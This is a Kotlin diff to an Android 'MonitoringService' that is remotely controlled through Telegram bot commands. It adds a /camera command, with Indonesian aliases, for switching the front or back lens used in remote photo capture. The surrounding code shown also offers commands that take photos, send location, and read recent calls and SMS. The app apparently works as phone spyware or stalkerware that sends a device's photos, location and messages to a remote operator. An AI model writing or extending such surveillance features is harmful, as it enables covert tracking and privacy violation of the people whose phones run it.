@@ -232,6 +232,7 @@ class MonitoringService : Service() {
                         appendLine("Queued: ${messageQueue.getQueueSize()}")
                         appendLine("Data interval: ${preferencesManager.syncInterval} min")
                         appendLine("Photos: $photoState")
+                        appendLine("Camera: ${preferencesManager.cameraFacing}")
                         appendLine("Camera permission: ${if (hasCameraPermission()) "granted" else "MISSING"}")
                         appendLine("Location permission: ${if (hasLocationPermission()) "granted" else "MISSING"}")
                         appendLine("Last photo: ${if (preferencesManager.lastPhotoTime > 0) formatDate(preferencesManager.lastPhotoTime) else "never"}")
@@ -299,11 +300,27 @@ class MonitoringService : Service() {
                     }
                 }
             }
+            "/camera" -> {
+                when (arg) {
+                    "belakang", "back" -> {
+                        preferencesManager.cameraFacing = "back"
+                        sendToTelegram("📸 Camera set to back.")
+                    }
+                    "depan", "front" -> {
+                        preferencesManager.cameraFacing = "front"
+                        sendToTelegram("📸 Camera set to front.")
+                    }
+                    else -> {
+                        sendToTelegram("Usage: /camera \u003cdepan|belakang\u003e (now: ${preferencesManager.cameraFacing})")
+                    }
+                }
+            }
             "/help", "/start" -> {
                 sendToTelegram(
                     buildString {
                         appendLine("🤖 <b>Commands</b>")
                         appendLine("/photo - take a photo now")
+                        appendLine("/camera \u003cdepan|belakang\u003e - switch camera")
                         appendLine("/location - send current location")
                         appendLine("/lastcalls - show last 5 calls")
                         appendLine("/lastsms - show last 5 SMS")
@@ -318,6 +335,14 @@ class MonitoringService : Service() {
                 )
             }
             else -> { /* ignore unknown input to avoid reply loops */ }
+        }
+    }
+
+    private fun selectedLensFacing(): Int {
+        return if (preferencesManager.cameraFacing == "back") {
+            android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
+        } else {
+            android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
         }
     }
 
@@ -706,6 +731,7 @@ class MonitoringService : Service() {
         try {
             android.util.Log.i("MonitoringService", "📸 Starting camera capture...")
             cameraService.capturePhoto(
+                lensFacing = selectedLensFacing(),
                 onPhotoTaken = { photoFile ->
                     cameraBusy.set(false)
                     serviceScope.launch {
